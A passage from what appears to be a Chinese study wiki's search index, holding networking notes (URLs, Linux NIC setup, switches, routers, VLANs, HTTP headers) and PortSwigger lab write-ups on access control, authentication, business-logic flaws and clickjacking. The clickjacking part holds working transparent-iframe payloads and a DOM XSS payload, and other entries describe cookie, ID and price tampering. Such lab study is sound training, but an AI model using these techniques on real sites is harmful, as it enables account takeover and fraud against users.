编码，每两位算作一组，然后每组头部添加百分号（%）。 绝对 URL 和相对 URL 绝对 URL 指的是，只靠 URL 本身就能确定资源的位置。这意味着，URL 必须带有资源的完整信息，包含协议、主机、路径等部分。前面的例子都是绝对 URL。 相对 URL 指的是，URL 不包含资源位置的全部信息，必须结合当前网页的位置，才能定位资源。比如，当前网页的 URL 是 https://www.example.com/path/index.html 该网页上面有一个资源，URL 指向a.html，这个就是相对 URL。因为只知道a.html，并不能定位资源。浏览器假定，a.html与当前网址在同一个子目录下面，从而得到绝对 URL https://www.example.com/path/a.html 相对 URL 如果以斜杠（/）开头，就表示网站的根目录。否则，必须以当前目录为起点，推算资源的位置。比如，相对 URL /foo/bar.html表示网站根目录的子目录foo，foo/bar.html表示在当前目录的foo子目录 URL 还可以使用两个特殊简写，表示特定位置。 .：表示当前目录，比如./a.html（当前目录下的a.html文件） ..：表示上级目录，比如../a.html（上级目录下的a.html文件） 这两种简写可以多个连用，比如../../表示上两级目录。 绝对 URL 也可以使用这两个简写，比如www.example.com/./index.html等同于www.example.com/index.html，这时.相当于根目录的当前目录，即根目录本身。 实现 URL 的编码与解码编码转换工具 Linux网卡 Linux网卡配置与绑定 在linux系统中进行网络管理，使用 ifconfig 命令。 但 ifconfig 命令配置的网卡信息，在网卡重启后机器重启后，配置就不存在。要想将上述的配置信息永远的存的电脑里，那就要修改网卡的配置文件了 一般来说，先通过ifconfig命令，先查看本机网卡配置 可以看到本机只有一个网卡ens33 ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 ether 00:0c:29:61:cb:98 txqueuelen 1000 (Ethernet) RX packets 1175 bytes 77066 (75.2 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 223 bytes 22817 (22.2 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 进入本机网卡配置文件，可以发现里面没有IP地址、子网掩码、网关和DNS等 vim /etc/sysconfig/network-scripts/ifcfg-ens33 TYPE=&quot;Ethernet&quot; #网卡类型为以太网 BOOTPROTO=&quot;dhcp&quot; #启用地址协议 –static:静态协议 –bootp:协议 –dhcp:协议 -none:不指定协议[最好指定] DEFROUTE=&quot;yes&quot; # 默认路由：是；就是default route，是否把这个eth设置为默认路由 PEERDNS=&quot;yes&quot; PEERROUTES=&quot;yes&quot; IPV4_FAILURE_FATAL=&quot;no&quot; # 是不开启IPV4致命错误检测：否 IPV6INIT=&quot;yes&quot; # IPV6是否自动初始化: 是 IPV6_AUTOCONF=&quot;yes&quot; # IPV6是否自动配置 IPV6_DEFROUTE=&quot;yes&quot; # IPV6是否可以为默认路由 IPV6_PEERDNS=&quot;yes&quot; IPV6_PEERROUTES=&quot;yes&quot; IPV6_FAILURE_FATAL=&quot;no&quot; # 是不开启IPV6致命错误检测：否 IPV6_ADDR_GEN_MODE=&quot;stable-privacy&quot; # IPV6地址生成模型：stable-privacy [这只一种生成IPV6的策略] NAME=&quot;ens33&quot; # 网卡物理设备名称 UUID=&quot;cc35a411-1918-4cad-9496-3474176e00f4&quot; #通用唯一识别码 DEVICE=&quot;ens33&quot; # 网卡设备名称, 必须和 `NAME` 值一样 ONBOOT=&quot;yes&quot; #系统启动时是否设置此网络接口，设置为yes时，系统启动时激活此设备 # 新增 IPADDR=192.168.103.203 #网卡对应的ip地址 PREFIX=24 # 子网 24就是255.255.255.0 GATEWAY=192.168.103.1 #网关 DNS1=114.114.114.114 # dns HWADDR=78:2B:CB:57:28:E5 # mac地址 # 重启网卡 service network restart PREFIX与NETMASK的作用一样 ip命令常用参数 Ip [选项] 操作对象&#123;link|addr|route...&#125; # ip link show # 显示网络接口信息 # ip link set eth0 upi # 开启网卡 # ip link set eth0 down # 关闭网卡 # ip link set eth0 promisc on # 开启网卡的混合模式 # ip link set eth0 promisc offi # 关闭网卡的混个模式 # ip link set eth0 txqueuelen 1200 # 设置网卡队列长度 # ip link set eth0 mtu 1400 # 设置网卡最大传输单元 # ip addr show # 显示网卡IP信息 # ip addr add 192.168.0.1/24 dev eth0 # 设置eth0网卡IP地址192.168.0.1 # ip addr del 192.168.0.1/24 dev eth0 # 删除eth0网卡IP地址 # ip route list # 查看路由信息 # ip route add 192.168.4.0/24 via 192.168.0.254 dev eth0 # 设置192.168.4.0网段的网关为192.168.0.254,数据走eth0接口 # ip route add default via 192.168.0.254 dev eth0 # 设置默认网关为192.168.0.254 # ip route del 192.168.4.0/24 # 删除192.168.4.0网段的网关 # ip route del default # 删除默认路由 为什么要设置DNS PING 外网其它主机，允许网卡访问外网主机 # 没设置 DNS 的话就失败了 [root@localhost ~]# ping baidu.com 为什么上不去网呢？这是因为当前 CentOS 还解析不了输入的 baidu.com 这个字符串, 我知道它是百度的域名, 你也知道, 但它就是不知道这是百度域名, 它解析 baidu.com 域名到底是对应哪一IP地址, 那好了, 去电脑本体下 ping 一下 baidu.com 这个域名, 给它加到 CentOS 系统的 hosts 文件这事也就靠谱了 配置网卡设备文件添加DNS域名解析服务器地址 DNS1=114.114.114.114 # 是国内移动、电信和联通通用的DNS DNS2=8.8.8.8 # GOOGLE公司提供的DNS,适合国外以及访问国外网站的用户使用 添加DNS域名解析服务器地址, 就是让 CentOS7 在使用 ping 命令时, 一看给的是一个字串符而非IP地址, 就通过 域名解析服务器 查找对应的IP地址, 然后通过IP去 ping 对应的主机这事也就妥妥的了, 简单的说明这个问题它就是这样, 要想知道它具体都干什么事情了, 你还得去研究一下 网络参考模型 以及 协议 这些事！ 交换机 参考： 「网络安全」网络设备篇_51CTO博客 交换机概述 - 博客园 交换机的简介及数据通信过程_51CTO博客 开宗明义，概念先行 交换机是一个扩大网络的设备，能为子网中提供更多的连接端口，以便连接更多的电脑。 通俗来说其起到的作用就是把一个网络端口分成多个网络端口，就像从一根水管里流出的水，你用多根水管同时去分流。· 交换机是一种开关，用于电信号转化成网络信号，可以接入任何两个网络节点，并且提供专门的电信号通路，最经常使用就是太网交换机。 交换机是构建局域网络不\t可或缺的集线设备。作为局域网通信的重要枢纽和节点，其主要功能就是连接设备。交换机最主要的功能就是连接计算机、服务器、网络打印机、网络摄像头、IP电话 等终端设备，并实现与其他交换机、无线接入点、网络防火墙、路由器等网络设备的互连，从而构建局域网络，实现所有设备之间的通信 交换机工作在OSI模型的数据链路层 交互机的工作原理 交换机位于OSI参考模型中的数据链路层（即第二层），是一种基于MAC地址识别的，用于完成数据的封装和转发的网络设备。交换机可以“学习”MAC地址，并把其存放在内部地址表中，通过在数据帧的始发者和目标接收者之间建立临时的交换路径，使数据帧直接由源地址到达目的地址。 因此，交换机就像是一个业务熟练的调度员，能够准确地将装载数据的汽车从出发路口直接派送至目的地路口。当然，要完成这样繁重和智能化的工作，交换机也需要一个学习和记忆的过程。计算机借助网卡连接到局域网络，而每块网卡都有其与生俱来的“胎记”——MAC地址。交换机通过“学习”，会把连接到每个端口的MAC地址记住，形成一个端口与MAC地址的对应表。 MAC 地址也称为物理地址，硬件地址和老化地址。 交换机工作过程 （1）当交换机从某个端口收到一个数据包时，先读取包头中的源MAC地址，从而建立源端口与源MAC地址的对应关系，并将其添加至地址表。由于交换机能够自动根据收到的以太网帧中的源MAC地址更新地址表的内容，所以交换机使用的时间越长，学习到的MAC地址就越多，未知的MAC地址就越少，因而广播的包就越少（如果目的MAC地址未知，则将该包作广播包处理），处理速度就越快。 （2）读取包头中的目的MAC地址，并在地址表中查找相应的端口。 （3）如果地址表中有与该目的MAC地址对应的端口，则把数据包直接复制到这端口上。由于不是将该帧发送到所有端口，从而使那些既非源端口又非目的端口的端口间仍然可以进行相互间的通信，进而提供了更高的传输速率。 （4）如果在MAC地址表中没有找到该MAC地址，也就是说，该目的MAC地址是首次出现，则将该帧发送到所有其他端口（源端口除外），相当于该帧是一个广播帧。拥有该MAC地址的网卡在接收到该广播帧后，将立即作出应答，从而使交换机将“端口号-MAC地址”对照表添加到地址表。不断重复上述过程，交换机即可实现所有数据的转发，并逐步学习和记忆整个网络中的MAC地址，不断丰富和完善自己的MAC地址表。 总结：由此可见，交换机的工作过程可以概括为“学习-记忆-接收-查找-转发”。 通过广播方式“学习”网卡MAC地址，并将“MAC地址-端口号”的对应关系创建为一个地址表“记忆”在内存中。 从源端口“接收”到数据后，在地址表中“查找”与目的MAC地址相对应的端口，然后将数据帧“转发”至目的端口。 注意：交换机不会永久性地记住所有的端口号―MAC地址关系。 由于交换机中的内存有限，因此能够记忆的MAC地址数量也是有限的。 既然不能无休止地记忆所有的MAC地址，那么也必须赋予其相应的忘却机制，从而吐故纳新。 事实上，交换机设计了一个自动老化时间（Auto-aging Time）机制，若某MAC地址在一定时间内（默认为300 s）不再出现，那么交换机将自动把该MAC地址从地址表中清除。 当下一次该MAC地址重新出现时，将会被当做新地址处理。 另外，由于地址表是保存在内存中的，因此当交换机断电或重新启动后，地址表数据将会全部丢失，必须重新学习。 交换机可以在任意一对端口之间建立临时专用通道，不同端口间的转发可以并行操作。 这就像是在各端口间建立起了一座立交桥，形成立体交叉结构，不同流向的数据各行其道，每个端口均能够独享固定带宽，传输速率几乎不受计算机数量的影响。 另外，当两个或两个以上的端口与同一目的端口进行通信时，交换机将把这些数据帧暂时保存在缓存中，然后根据顺序对其逐一处理和转发，从而实现“多”对“一”的通信。 路由器 参考： 路由器的基本原理与配置命令（静态路由和默认路由） 交换机和路由器的数据包转发流程简述_丿咫尺天涯的博客-CSDN博客 开宗明义，概念先行 路由器工作在OSI参考模型的网络层，它的作用是为数据包选择最佳路径，最终送达目的地。 路由器（Router），是连接因特网中各局域网、广域网的设备，它会根据信道的情况自动选择和设定路由，以最佳路径，按前后顺序发送信号。路由器是互联网络的枢纽，“交通警察”。 路由器（Router）又称***网关设备***（Gateway）是用于连接多个逻辑上分开的网络，所谓逻辑网络是代表一个单独的网络或者一个子网。 路由器的工作原理 路由表是路由器的地图，指引路由器的方向。 在路由表中，包含了每个路由器所掌握的所有*目的地的网络地址*，以及通过此路由器到达这些网络的最佳路径。 这个最佳路径是指路由器的***某个接口或下一跳路由器的地址***，由于路由表的存在，路由器才能高效的进行数据包的转发。 交换机和路由器的数据包转发流程 网络设备之间通信： 发送端的数据向外发送一个数据包 系统判断这个数据包的目标地址是否在*同一个网段* 若与发送机属于同一网段，系统直接将数据包封装成帧，通过二层设备发送到本网段内的目标地址 若不在同一网段，系统将数据包转发到*网关*，重新封装 网关查看数据包送达的目标ip地址 系统根据目标ip地址查找路由表，决定转发端口 重新封装转发到下一个路由器 网关发现目标地址属于本网段，查找MAC表（ip与mac对应关系），封装成帧发送到目标机器网卡 目标主机验证后传送给上层应用 具体路由器转发规则： 当主机A发向主机B的数据流在网络层封装成IP数据包，IP数据包的首部包含了源地址和目标地址 主机A会用本机配置的24位IP网络掩码255.255.255.0与目标地址进行与运算，得出目标网络地址与本机的网络地址*是不是在同一个网段*中。如果不是将IP数据包转发到网关 在发往网关前主机A还会通过ARP的请求获得默认网关的MAC地址。在主机A数据链路层IP数据包封装成以太网数据帧，然后才发住到网关……也就是路由器上的一个端口 当网关路由器接收到以太网数据帧时，发现数据帧中的目标MAC地址是自己的某一个端口的物理地址，这时路由器会把以太网数据帧的封装去掉。路由器认为这个IP数据包是要通过自己进行转发，接着它就在匹配路由表。匹配到路由项后，它就将包发往下一条地址。 路由器转发数据包就是这样，所以它始终是不会改IP地址的。只会改MAC VLAN 参考： VLAN技术浅谈-新华三集团-H3C 开宗明义，概念先行 vlan的全称是Virtual Local Area Network，即“虚拟局域网”，把一个大的局域网，分成多个隔离的，小的局域网。 它的作用就是将物理上互连的网络在逻辑上划分为多个互不相干的网络，这些网络之间是无法通讯的，就好像互相之间没有连接一样，因此广播也就隔离开了。VLAN的实现原理非常简单，通过交换机的控制，某一VLAN成员发出的数据包交换机只发给同一VLAN的其它成员，而不会发给该VLAN成员以外的计算机。简言之，一个VLAN就是一个广播域。 为什么需要 vlan 广播域被限制在一个 VLAN 内，节省了带宽，提高了网络处理能力。 增强局域网的安全性：VLAN 间不能直接通信，即一个 VLAN 内的用户不能和其它 VLAN 内的用户直接通信，而需要通过路由器或三层交换机等三层设备。 灵活构建虚拟工作组：用 VLAN 可以划分不同的用户到不同的工作组，同一工作组的用户也不必局限于某一固定的物理范围，网络构建和维护更方便灵活。 OSI 参考模型 参考： [OSI七层模型与TCP/IP五层模型](https://www.cnblogs.com/qishui/p/5428938.html) TCP/IP五层协议 Http 头信息 HTTP headers - 腾讯云 Http头信息（一）——通用头信息（一） Http头信息（二）——请求头信息（一） Http头信息（三）——响应头信息（一） 这可能是最全的Http头信息资料了 请求和响应都有的 /* 对于请求来说，该指令的意思是：可以给我缓存，但是这个缓存必须是向服务器验证后证明是有效的。 对于响应来说，该指令的意思是：可以缓存这个响应，但使用前必须向服务器做有效性验证 */ Cache-Control:no-cache /* 对于请求和响应来说，不得以任何形式存储请求或响应的内容 */ Cache-Control:no-store /* 对于请求来说，可以接收：自响应被发送那一刻开始算起，不超过60秒的缓存 对于响应来说，这个响应可以缓存，且有效期为60秒 */ Cache-Control:max-age=60 /* 对于请求和响应来说，缓存不能改变其内的媒体类型。例如不能压缩等 */ Cache-Control:no-transform 请求专用的 /* 可以接收过了有效期(max-age指定)，但是没过max-stale的缓存 */ Cache-Control:max-stale=60 /* 可以接收在未来60秒内，处于有效期(max-age指定)的缓存 */ Cache-Control:min-fresh=60 /* 只接收缓存。如果没有缓存，则返回 504 Gateway Timeout */ Cache-Control:only-if-cached 响应专用的 /* 此响应可以被任何中间者缓存 */ Cache-Control:public /* 此缓存只能被发起请求的客户端缓存 */ Cache-Control:private /* 缓存过期后，使用前，必须向服务器做有效性验证。 在Http 1.1规范里，是允许某些情况下直接使用过期缓存的。而加入这个命令，就决不允许使用过期缓存了 */ Cache-Control:must-revalidate /* 与must-revalidate一致，区别为：这个指令不能作用于私有缓存上。什么是私有缓存？ Cache-Control:private会将缓存存在私有缓存中 */ Cache-Control:proxy-revalidate /* 与max-age类似，这里的s代表共享，并且，这个指令仅用于CDNs或者其他中间者（intermediary caches）。这个指令会覆盖max-age和expires响应头 */ Cache-Control:s-maxage=60 http 头部 http 头部： 请求： User-Agent——关于浏览器和它平台的信息，如 Mozilla4.0 Accept——客户能处理的页面的类型，如 text、html Accept-Charset——客户可以接受的字符集，如 Unicode-1-1 Accept-Encoding——客户处理的页面编码方式，如 gzip Accept-Language——客户能处理的自然语言，如 en（英语），zh-cn（简体中文） Host——服务器的 DNS 名称，从 URL 中提取出来，必须 Referer——用户从改 URL 代表的页面触发访问当前请求的页面 Cookie——将以前设置的 Cookie 送回服务器，可用来作为会话信息 双向： Date——消息被发送的日期和时间 响应： Server——服务器的信息 Content-Encoding——内容是如何编码的 Content-Language——页面使用的自然语言 Content-Length——以字节计算的页面长度 Content-type——页面的 MIME 类型 Last-Modified——页面最后修改的时间和日期，在页面缓存机制中意义重大 Location——指示客户将请求发送给别处，即重定向到另一个 URL Set-Cookie——服务器希望客户保存一个 Cookie 转义字符 在MYSQL中 '\\'(反斜杠)被用来转义一个字符。转义一个字符意味着取消该字符的特殊用途。使用转义字符可以得到更清楚的图片 http 请求中的 payload payload，翻译过来是有效载荷 抽象一下，payload 可以理解为一系列信息中最为关键的信息。 对于程序员来说就是在程序中 起关键作用的代码。 安全方面： 通常在传输数据时，为了使数据传输更可靠，要把原始数据分批传输，并且在每一批数据的头和尾都加上一定的辅助信息， 比如数据量的大小、校验位等，这样就相当于给已经分批的原始数据加一些外套，这些外套起标示作用，使得原始数据不易丢失， 一批数据加上“外套”就形成了传输通道的基本传输单元，叫做数据帧或数据包，而其中的原始数据就是 payload Kali Linux 文件系统 默认的文件系统 /bin： bin 是 Binaries (二进制文件) 的缩写， 这个目录存放着最经常使用的命令。 /boot 这里存放的是启动 Linux 时使用的一些核心文件，包括一些连接文件以及镜像文件。 **/dev ** dev 是 Device(设备) 的缩写， 该目录下存放的是 Linux 的外部设备，在 Linux 中访问设备的方式和访问文件的方式是相同的。 /etc etc 是 Etcetera(等等) 的缩写，这个目录用来存放*所有的系统管理所需要的配置文件和子目录。* /home 用户的主目录，在 Linux 中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的 /lib lib 是 Library(库) 的缩写这个目录里存放着系统最基本的动态连接共享库，其作用类似于 Windows 里的 DLL 文件。几乎所有的应用程序都需要用到这些共享库。 /media Linux 系统会自动识别一些设备，例如 U 盘、光驱等等，当识别后，Linux 会把识别的设备挂载到这个目录下。 /mnt 系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在 /mnt/ 上，然后进入该目录就可以查看光驱里的内容了。 /opt opt 是 optional(可选) 的缩写，这是给主机额外安装软件所摆放的目录。比如你安装一个 Oracle 数据库则就可以放到这个目录下。默认是空的。 /root 该目录为系统管理员，也称作超级权限者的用户主目录。 /tmp tmp 是 temporary(临时) 的缩写这个目录是用来存放一些临时文件的。 /usr usr 是 unix shared resources(共享资源) 的缩写，这是一个非常重要的目录，用户的很多应用程序和*文件*都放在这个目录下，类似于 windows 下的 program files 目录。 /usr/bin 系统用户使用的应用程序。 /usr/sbin 超级用户使用的比较高级的管理程序和系统守护程序。 /usr/src 内核源代码默认的放置目录。 /var var 是 variable(变量) 的缩写，这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。 /run 是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 /var/run 目录，应该让它指向 run。","tags":["网络"],"categories":["计算机网络"]},{"title":"comments","path":"/comments/index.html","content":"留下您的足迹，我会仔细阅读每一条留言。谢谢您的关注和支持！","categories":[null]},{"title":"Portswigger 靶场之“访问控制漏洞”","path":"/wiki/portswigger/access-control.html","content":"Access control vulnerabilities All labs | Web Security Academy (portswigger.net) 1. Unprotected admin functionality 不受保护的管理功能 没有限制的 admin 面板，进去删帐号robots.txt /administrator-panel 2. Unprotected admin functionality with unpredictable URL 具有不可预测的 URL 的未受保护的管理功能 Ctrl + U 打开页面源代码，通过 Ctrl + F 搜索admin字符并观察 3. User role controlled by request parameter 由请求参数控制的用户角色 这一关的要点在于修改 Cookie，登录帐号后会发现有一个 cookie 值是 Admin false ，改为true，再访问 /admin，就会发现删除界面 4. User role can be modified in user profile 可以在用户配置文件中修改用户角色 更新邮件的地方是 JSON 数据，可以往里面多塞一些东西，然后浏览 /admin 界面删除用户 5. User ID controlled by request parameter 由请求参数控制的用户 ID 登录账户后抓包继而发现存在参数 ?id=wiener，替代为 carlos 从而获取 carlos 用户的 API 6. User ID controlled by request parameter, with unpredictable user IDs 用户 ID 由请求参数控制，用户 ID 不可预测 从博客文章中找到 carlos，用 burp 拦截，复制 ID 登录账户，用 burp 将 carlos 的 ID 写入请求 7. User ID controlled by request parameter with data leakage in redirect 用户 ID 由请求参数控制，重定向中存在数据泄漏 API KEY 在redirect（重定向） 的response（响应）中 8. User ID controlled by request parameter with password disclosure 用户 ID 由具有密码泄露的请求参数控制 修改 ID 后，F12 选到 Password 的地方，就可以看到密码 9. Insecure direct object references 不安全的直接对象引用 环顾四周，发现右上角有个Live chat，实时聊天室 和机器人对话并点击View transcript会把刚和机器人聊天的内容下载到一个txt文本文档中。 把URL改为download-transcript/1.txt即可得到密码 10. URL-based access control can be circumvented 可以规避基于 URL 的访问控制 先访问 admin，失败，继而进行抓包，添加X-Original-URL: /invalid成功，后面如法炮制 11. Method-based access control can be circumvented 可以规避基于方法的访问控制 先登录管理员账户，升级 carlos 的同时抓包，发送到 Repeater 在隐私浏览器窗口，登录wiener:peter，将 Cookie 复制到 Repeater 中，并且右键单机Change request method将请求方法改为 GET，用户名参数由 Carlos 改为 wiener 12. Multi-step process with no access control on one step 多步骤过程，一步没有访问控制 登录 Admin 帐号和 wiener 帐号 wiener 帐号抓到 Cookie 值复制带到 Repeater 中…… 13. PRACTITIONER Referer-based access control 基于引用的访问控制","tags":[null,null],"categories":[null]},{"title":"PortSwigger 之“身份认证”","path":"/wiki/portswigger/authentication.html","content":"https://portswigger.net/web-security/all-labs#authentication Authentication 1. 通过不同的响应进行用户名枚举 在登录页面填入账号密码通过 burp 抓包，发送到 Intruder 模块，枚举用户名，观察 length 的不一致来找到用户名，紧接着枚举密码…… 2. 2FA简单旁路 攻击者登录账号wiener:peter并接收邮箱验证码，在我的账户页面，填入验证码后复制 URL 地址（目的是模拟用户访问自己的账户），紧接着注销帐户。 登录受害者账号carlos:montoya，在接收邮箱验证码页面，修改地址栏中的URL 地址 3. 密码重置损坏的逻辑 这一关主要是利用密码重置，跳过令牌检查来修改密码，从而获取系统的访问权限 解题步骤： 在网站中忘记密码，填入 wiener，在电子邮件发出的链接中重置密码。 将“密码重置功能“发送到 Repeater，观察请求和响应，发现 token 是无效的，将用户名 wiener 修改为 carlos 后可成功修改 carlos 用户的密码 4. 通过细微不同的响应进行用户名枚举","tags":[null,null],"categories":[null]},{"title":"Portswigger 靶场之“业务逻辑漏洞","path":"/wiki/portswigger/business-logic-flaws.html","content":"All labs | Web Security Academy (portswigger.net) Business logic vulnerabilities 1. Excessive trust in client-side controls 过度信任客户端控制 登录wiener:peter，购买Lightweight &quot;l33t&quot; Leather Jacket，价格是$1337.00，下单后显示商店积分不够，不可以购买 在 Burp 中，截断Add to cart功能，修改价格（price）为1以满足商店的信用额度，完成订单以解决实验室。 2. High-level logic vulnerability 高级逻辑漏洞 登录wiener:peter，把Lightweight &quot;l33t&quot; Leather Jacket（轻质“l33t”皮夹克）添加到购物车，通过用 burp 抓包，发现价格参数price没有了，剩下了数量参数quantity。 尝试去修改数量参数quantity为-1，果不其然，成功修改，但下单后不被允许金额小于零，无法下单。 于是通过叠加商品，既满足Store credit（店铺积分）100元之内，又满足下单金额是大于零的要求 依旧是把一个Lightweight &quot;l33t&quot; Leather Jacket（轻质“l33t”皮夹克）添加到购物车；再购买The Giant Enter Key（巨型回车键），数量用1337/25.35=52.74来计算 3. Inconsistent security controls 不一致的安全控制 在 Burp Suite 中，使用 Site map（站点地图）功能，来查看站点目录，发现路径admin。访问/admin，页面回显需要“DontWannaCry ”用户登录才可访问 页面右上角Register 注册一个账号，其中邮箱需要点击页面上方的Email client获得，注册后会发来一封邮件点击验证一下，然后登录账户，紧随其后修改邮箱为 @DontWannaCry.com 这时候就可以访问管理面板了，删除用户即可 4. Flawed enforcement of business rules 有缺陷的业务规则执行 注意到页面有一个优惠券代码——NEWCUST5，页面底部可通过注册获得优惠券代码SIGNUP30 添加商品到购物车，尝试优惠券的使用，发现连续两次输入相同的代码，不被允许，而交替使用可绕过，就一直叠加 5. Low-level logic flaw 低级逻辑缺陷 登录账号，购买商品的数量一次最多可以 +99，可以用 Burp 的 intruder 送到 Overflow Quote / 参考 int overflow（整数溢出）是指在计算机中，对一个整数类型（例如 int、long 等）进行计算时，结果超出了该类型可以表示的最大值（或最小值），导致结果不正确的情况。 在计算机中，整数类型的表示是有限的，即它们可以表示的范围是有限的。例如，一个 32 位的有符号整数类型 int 可以表示从 -2,147,483,648 到 2,147,483,647 的整数，如果在计算时得到的结果超过了这个范围，就会发生整数溢出。 6. Inconsistent handling of exceptional input 异常输入的不一致处理 需要进入/admin目录，删除 Carlos。 首先注册一个用户，验证用户，返回该用户的时候发现并没有修改邮箱的选项。 于是在注册页面修改邮箱，利用长度截断（256个字符）使得注册的邮箱地址为@dontwannacry.com。注册完验证后登录账户以便删除 Carlos。 bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb@dontwannacry.com.0a0800c503176684c4ae681001ba00e2.web-security-academy.net 7. Weak isolation on dual-use endpoint 两用端点上的弱隔离 登录 wiener 用户后，在修改密码的界面发现，可以修改任意“用户”的密码，但需要输入当前密码（当前密码未知），通过 burp 截断数据包分析得知，当前密码是可以删除来绕过此限制的。 8. Insufficient workflow validation 工作流程验证不足 登录账号，购买一个2.04的商品（少于商店积分 100），观察代理历史记录，注意到下订单时，POST 请求会重定向到订单确认页面 添加1337 的那款商品，下单观察代理历史记录，研究两者之间的差异，注意到2.04的商品 GET 请求为GET /cart/order-confirmation?order-confirmation=true即可购买成功，把1337 的商品进行修改也可绕过限制 9. Authentication bypass via flawed state machine 通过有缺陷的状态机绕过身份验证 用 burp 拦截登录请求，Forward POST 请求，Drop Redirect，然后直接访问/admin 登录的请求有两个，第一个是 POST 请求，第二个是重定向 GET 请求，作用是选择角色转到主页，将第二个包丢弃可默认为该角色，即可访问管理面板 10. Infinite money logic flaw 无限金钱逻辑缺陷 home 页底部注册得到 SIGNUP30，可以购买 10 美元的礼品卡并从“my-account”页面兑换，兑换的过程中注意到商店信用增加了（用 Burp 或者 Python 自动执行此过程） 攻击完成后，商店的总体信用额度将提升足以购买“皮夹克” 11. Authentication bypass via encryption oracle 通过加密 oracle 绕过身份验证 登录后有一个 Stay Logged in（保持登录状态）的功能，且是加密后的 未完……","tags":[null,null],"categories":[null]},{"title":"portswigger 靶场之点击劫持（Clickjacking）","path":"/wiki/portswigger/clickjacking.html","content":"All labs | Web Security Academy — 所有实验室 |网络安全学院 (portswigger.net) 1. Basic clickjacking with CSRF token protection 具有 CSRF 令牌保护的基本点击劫持 目标： 制作一些 HTML 来构建帐户页面并欺骗用户删除他们的帐户 过程： 先登录账号，登录后界面上有个选项为Delete account，即删除账户。 页面上方有个Go to exploit server去利用服务器，点进去，在Body中写入HTML代码并用CSS来绝对定位选项Delete account的位置。 设置透明度opacity使得攻击者看不到真实的界面，Delete account选项被隐藏在&lt;div&gt;Click Me&lt;/div&gt;之下 Quote / 参考 在点击劫持攻击中，攻击者会将一个透明的iframe覆盖在目标网站的页面上，然后诱使受害者在该iframe中点击某些看似无害的按钮或链接，实际上却是在执行攻击者的恶意操作 攻击者使用iframe的目的是为了掩盖受害者的真实行为。因为iframe可以嵌入其他网站或页面，攻击者可以在iframe中展示一个看似无害的页面或按钮，但实际上它们可能会触发跨站点请求，执行攻击者的恶意操作。 &lt;style&gt; iframe &#123; position:relative; width:1000px; height: 700px; opacity: 0.0000001; z-index: 2; &#125; div &#123; position:absolute; top:515px; left:60px; z-index: 1; &#125; &lt;/style&gt; &lt;div&gt;Click Me&lt;/div&gt; &lt;iframe src=&quot;https://0a37007803673341c044c7f400150047.web-security-academy.net/my-account&quot;&gt;&lt;/iframe&gt; 2. Clickjacking with form input data prefilled from a URL parameter 使用从 URL 参数预填充的表单输入数据进行点击劫持 目标： 诱使用户点击“更新电子邮件”按钮 过程： 登录账号，转到服务器界面，这一关，主要是通过 GET 参数的方式预填充表单，即在 URL 上添加了修改的邮箱 &lt;style&gt; iframe &#123; position:relative; width:500px; height: 700px; opacity: 0.00; z-index: 2; &#125; div &#123; position:absolute; top:450px; left:80px; z-index: 1; &#125; &lt;/style&gt; &lt;div&gt;Test me&lt;/div&gt; &lt;iframe src=&quot;https://0a3800d603ebc15ac0aa4aa0002c0090.web-security-academy.net/my-account?email=111@123.com&quot;&gt;&lt;/iframe&gt; 3. Clickjacking with a frame buster script 使用 frame buster 脚本进行点击劫持 目标： 诱使用户点击“更新电子邮件”按钮 过程： 先登录账号，然后到服务器界面，这一关运用了sandbox 属性，限制 iframe 嵌套，使其失效。 可通过在iframe标签中设置sandbox=&quot;allow-forms&quot;来绕过限制 Quote / 参考 &quot;Frame buster&quot; 技术使用 JavaScript 代码来检测页面是否被嵌套在框架中 在 HTML 中，sandbox=&quot;allow-forms&quot; 是一种设置 iframe（内嵌框架）安全性的方法之一。该属性指定在 iframe 中是否允许表单提交。 当 sandbox 属性的值为 allow-forms 时，表示在 iframe 中允许表单提交，但不允许执行其他一些操作，如运行脚本、显示弹出窗口等。 &lt;style&gt; iframe &#123; position:relative; width:500px; height: 700px; opacity: 0.1; z-index: 2; &#125; div &#123; position:absolute; top:450px; left:80px; z-index: 1; &#125; &lt;/style&gt; &lt;div&gt;Click me&lt;/div&gt; &lt;iframe sandbox=&quot;allow-forms&quot; src=&quot;https://0a0e00d50460a332c236f332009c00c0.web-security-academy.net/my-account/?email=hacker@attacker-website.com&quot;&gt;&lt;/iframe&gt; 4. Exploiting clickjacking vulnerability to trigger DOM-based XSS 利用点击劫持漏洞触发基于 DOM 的 XSS 目标： 欺骗用户单击“单击我”按钮来调用函数。print() 过程： 先登录账号，然后到服务器界面，这一关在 iframe 的点击劫持中附加了 DOM XSS。 通过 name 输入框，放入 JavaScript 脚本&lt;img src=1 onerror=print()&gt;，因为这个 img 标签的 src 属性的值是 1，所以这个图片肯定是不存在的，因此会触发 onerror 事件，并且执行 print() 函数。print() 是 JavaScript 的内置函数，能够在弹窗中输出内容。 &lt;style&gt; iframe &#123; position:relative; width:500px; height: 700px; opacity: 0.1; z-index: 2; &#125; div &#123; position:absolute; top:620px; left:40px; z-index: 1; &#125; &lt;/style&gt; &lt;div&gt;Click me&lt;/div&gt; &lt;iframe src=&quot;https://0a2a00e403c20784c0166d6a00c800b2.web-security-academy.net/feedback/?name=&lt;img src=1 onerror=print()&gt;&amp;email=hacker@attacker-website.com&amp;subject=test&amp;message=test#feedbackResult&quot;&gt;&lt;/iframe&gt; 5. Multistep clickjacking 多步点击劫持 目标： 诱骗用户单击删除帐户按钮和确认对话框 过程： 需要执行两个步骤，删除用户 --&gt; 确认删除，所以设置两个点击按钮 &lt;style&gt; iframe &#123; position:relative; width:500px; height: 700px; opacity: 0.1; z-index: 2; &#125; .firstClick, .secondClick 